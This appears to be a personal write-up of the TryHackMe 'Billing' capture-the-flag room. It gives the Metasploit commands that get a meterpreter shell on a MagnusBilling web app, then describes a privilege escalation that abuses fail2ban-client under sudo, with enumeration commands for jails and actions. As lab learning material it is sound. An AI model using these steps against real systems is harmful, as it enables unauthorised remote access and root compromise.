
2025-03-31 20:59

Source: #tryhackme #Boot2root #privesc 

Web page at port 80 which has a login page
### Enumeration 

Dirsearch shows a lot of options 
`README.md` holds version number of the service running on the app (i.e. MagnusBilling)

Then I did a bit of digging online and found [this](https://eldstal.se/advisories/230327-magnusbilling.html). (This didn't work)
### Exploiting 

Because this exploit was on Metasploit we do it that way 
below is the list of commands used to obtain meterpreter shell from start to end 
```
msfconsole 
search MagnusBilling
use 0 
set LHOST tun0
set RHOSTS billing.thm
exploit 
```

After getting the meterpreter shell type `shell` to get access to all Unix shell commands 
### Privesc 

`sudo -l` shows that `Fail2ban` runs as root

Fail2ban-client is a command-line tool that helps in managing the Fail2ban service. Fail2ban is a security tool that protects your server from potential threats like brute-force attacks by monitoring the log files for specific patterns (typically failed login attempts) and taking action, such as temporarily banning the offending IP addresses.

With the fail2ban-client, you can interact with the Fail2ban service to perform actions such as starting or stopping jails, viewing or updating settings, and checking the status of different jails on your server. Essentially, it helps you control how your server responds to suspicious activities to keep it secure.

I mainly read [this](https://juggernaut-sec.com/fail2ban-lpe/) to understand how I could leverage PE

Since I couldn’t edit the config files, I had to get a bit creative and think outside the box to figure out my next move. I decided to do a bit of reading on the [fail2ban man page](https://linux.die.net/man/1/fail2ban-client). I found out we could use the binary to enumerate the information necessary. Furthermore, we could use it to perform the exploit as well.


First up, I needed to enumerate the active jails on the system to see what I was working with:

```
sudo /usr/bin/fail2ban-client status
```

`SSHD` was set as one of the jails, so we figure out what actions from the `action.d` folder it has set up on it:

```
sudo /usr/bin/fail2ban-client get sshd actions
```

Next, we add an action for the `iptables-multiport` to run when an `ip` gets banned on the `sshd` service. This action will be for the binary to read the root.txt file.

### References
[TryHackMe | Billing](https://tryhackme.com/room/billing)

[CTF Chronicles: Billing | THM – NATSec](https://natsecure.wordpress.com/2025/03/08/ctf-chronicles-billing-thm/)